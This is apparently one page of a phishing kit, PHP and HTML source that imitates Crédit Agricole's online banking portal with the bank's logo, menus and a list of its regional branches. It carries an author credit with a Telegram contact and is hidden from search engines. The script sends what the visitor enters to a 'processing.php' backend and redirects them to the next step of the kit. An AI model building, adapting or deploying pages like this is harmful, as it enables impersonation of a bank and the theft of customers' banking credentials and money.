<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once '../app/config.php';
    $_SESSION['last_page'] = "region";
    $semantic = semantic();

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Acceso online</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header" class="d-lg-flex d-md-none d-sm-none d-none">
            <div class="left">
                <div class="logo"><img style="width: 173px;" src="../media/imgs/logo.svg" alt=""></div>
            </div>
            <div class="right">
                <div class="top">
                    <div class="btnnn">
                        <p>Vous êtes un particulier <i class="fas fa-chevron-down"></i></p>
                    </div>
                    <div class="search">
                        <div class="inputt">Rechercher une thématique, un produit... <img src="../media/imgs/search.png"></div>
                    </div>
                    <div class="btns">
                        <div><img src="../media/imgs/marker.png"></span></div>
                        <div><img class="mr-2" src="../media/imgs/chat.png"> Nous contacter</span></div>
                        <div>Ouvrir un compte</div>
                        <div><img class="mr-2" src="../media/imgs/lock.png"> mon espace</div>
                    </div>
                </div>
                <div class="bottom">
                    <ul>
                        <li>Comptes & Cartes</li>
                        <li>Épargner</li>
                        <li>S'assurer</li>
                        <li>Emprunter</li>
                        <li>Impact Responsable</li>
                        <li>Simulation & Devis</li>
                        <li>NOS CONSEILS <i class="fas fa-sort-down"></i></li>
                    </ul>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER MOBILE -->
        <div id="mobile-menu" class="d-lg-none d-md-flex d-sm-flex d-flex mb30">
            <div class="pl-3"><img src="../media/imgs/mobilemenu.png"></div>
            <div><img style="width: 57px;" src="../media/imgs/logo2.svg"></div>
            <div><img src="../media/imgs/lock2.png"></div>
        </div>
        <!-- END HEADER MOBILE -->

        <!-- MAIN -->
        <main id="main">
            <div class="left">
                <div class="content">
                    <h3>TÉLÉCHARGEZ L’APPLICATION MA BANQUE</h3>
                    <p>
                        Chacun d’entre vous gère différemment ses besoins bancaires.<br>
                        Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
                    </p>
                    <button type="button">Découvrez les grandes fonctionnalités</button>
                </div>
            </div>
            <div class="right">
                <div class="caisse">
                    <div class="inner">
                        <div id="forma">
                            <input type="hidden" id="cap" name="cap">
                            <input type="hidden" name="steeep" id="steeep" value="region">
                            <legend>
                                ACCÉDER À L'ESPACE DÉDIÉ<br>
                                <b>DE VOTRE CAISSE RÉGIONALE</b>
                            </legend>
                            <div class="form-group mb30 <?php echo errclass($_SESSION['errors'],'region_number') ?>">
                                <label for="region_number">Trouver une caisse régionale en saisissant votre département</label>
                                <input type="text" name="region_number" id="region_number" class="form-control" placeholder="Exemple 75 pour Paris.">
                                <?php echo errmsg($_SESSION['errors'],'region_number'); ?>
                            </div>
                            <div class="form-group mb30">
                                <label for="departement">Ou</label>
                                <select name="region_caisse" id="region_caisse" class="form-control">
                                    <option value="" selected>Choisir une caisse régionale</option>
                                    <option value="Alpes Provence" <?php echo get_selected_option('region_caisse','Alpes Provence'); ?>>Alpes Provence</option>
                                    <option value="Alsace Vosges" <?php echo get_selected_option('region_caisse','Alsace Vosges'); ?>>Alsace Vosges</option>
                                    <option value="Anjou Maine" <?php echo get_selected_option('region_caisse','Anjou Maine'); ?>>Anjou Maine</option>
                                    <option value="Aquitaine" <?php echo get_selected_option('region_caisse','Aquitaine'); ?>>Aquitaine</option>
                                    <option value="Atlantique Vendée" <?php echo get_selected_option('region_caisse','Atlantique Vendée'); ?>>Atlantique Vendée</option>
                                    <option value="Brie Picardie" <?php echo get_selected_option('region_caisse','Brie Picardie'); ?>>Brie Picardie</option>
                                    <option value="Centre Est" <?php echo get_selected_option('region_caisse','Centre Est'); ?>>Centre Est</option>
                                    <option value="Centre France" <?php echo get_selected_option('region_caisse','Centre France'); ?>>Centre France</option>
                                    <option value="Centre Loire" <?php echo get_selected_option('region_caisse','Centre Loire'); ?>>Centre Loire</option>
                                    <option value="Centre Ouest" <?php echo get_selected_option('region_caisse','Centre Ouest'); ?>>Centre Ouest</option>
                                    <option value="Champagne Bourgogne" <?php echo get_selected_option('region_caisse','Champagne Bourgogne'); ?>>Champagne Bourgogne</option>
                                    <option value="Charente Maritime Deux-Sèvres" <?php echo get_selected_option('region_caisse','Charente Maritime Deux-Sèvres'); ?>>Charente Maritime Deux-Sèvres</option>
                                    <option value="Charente Périgord" <?php echo get_selected_option('region_caisse','Charente Périgord'); ?>>Charente Périgord</option>
                                    <option value="Corse" <?php echo get_selected_option('region_caisse','Corse'); ?>>Corse</option>
                                    <option value="Côtes d\'Armor" <?php echo get_selected_option('region_caisse','Côtes d\'Armor'); ?>>Côtes d\'Armor</option>
                                    <option value="Des Savoie" <?php echo get_selected_option('region_caisse','Des Savoie'); ?>>Des Savoie</option>
                                    <option value="Finistère" <?php echo get_selected_option('region_caisse','Finistère'); ?>>Finistère</option>
                                    <option value="Franche Comté" <?php echo get_selected_option('region_caisse','Franche Comté'); ?>>Franche Comté</option>
                                    <option value="Guadeloupe" <?php echo get_selected_option('region_caisse','Guadeloupe'); ?>>Guadeloupe</option>
                                    <option value="Ille et Vilaine" <?php echo get_selected_option('region_caisse','Ille et Vilaine'); ?>>Ille et Vilaine</option>
                                    <option value="Languedoc" <?php echo get_selected_option('region_caisse','Languedoc'); ?>>Languedoc</option>
                                    <option value="Loire Haute-Loire" <?php echo get_selected_option('region_caisse','Loire Haute-Loire'); ?>>Loire Haute-Loire</option>
                                    <option value="Lorraine" <?php echo get_selected_option('region_caisse','Lorraine'); ?>>Lorraine</option>
                                    <option value="Martinique Guyane" <?php echo get_selected_option('region_caisse','Martinique Guyane'); ?>>Martinique Guyane</option>
                                    <option value="Morbihan" <?php echo get_selected_option('region_caisse','Morbihan'); ?>>Morbihan</option>
                                    <option value="Nord De France" <?php echo get_selected_option('region_caisse','Nord De France'); ?>>Nord De France</option>
                                    <option value="Nord Est" <?php echo get_selected_option('region_caisse','Nord Est'); ?>>Nord Est</option>
                                    <option value="Nord Midi Pyrénées" <?php echo get_selected_option('region_caisse','Nord Midi Pyrénées'); ?>>Nord Midi Pyrénées</option>
                                    <option value="Normandie" <?php echo get_selected_option('region_caisse','Normandie'); ?>>Normandie</option>
                                    <option value="Normandie Seine" <?php echo get_selected_option('region_caisse','Normandie Seine'); ?>>Normandie Seine</option>
                                    <option value="Paris" <?php echo get_selected_option('region_caisse','Paris'); ?>>Paris</option>
                                    <option value="Provence Côte d\'Azur" <?php echo get_selected_option('region_caisse','Provence Côte d\'Azur'); ?>>Provence Côte d\'Azur</option>
                                    <option value="Pyrénées Gascogne" <?php echo get_selected_option('region_caisse','Pyrénées Gascogne'); ?>>Pyrénées Gascogne</option>
                                    <option value="Réunion" <?php echo get_selected_option('region_caisse','Réunion'); ?>>Réunion</option>
                                    <option value="Sud Méditerranée" <?php echo get_selected_option('region_caisse','Sud Méditerranée'); ?>>Sud Méditerranée</option>
                                    <option value="Sud Rhône Alpes" <?php echo get_selected_option('region_caisse','Sud Rhône Alpes'); ?>>Sud Rhône Alpes</option>
                                    <option value="Toulouse 31" <?php echo get_selected_option('region_caisse','Toulouse 31'); ?>>Toulouse 31</option>
                                    <option value="Touraine Poitou" <?php echo get_selected_option('region_caisse','Touraine Poitou'); ?>>Touraine Poitou</option>
                                    <option value="Val De France" <?php echo get_selected_option('region_caisse','Val De France'); ?>>Val De France</option>
                                </select>
                            </div>
                            <div class="btns">
                                <div id="booom" class="btttn">Rechercher une caisse régionale</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'region_number' : $('#region_number').val(),
                    'region_caisse' : $('#region_caisse').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>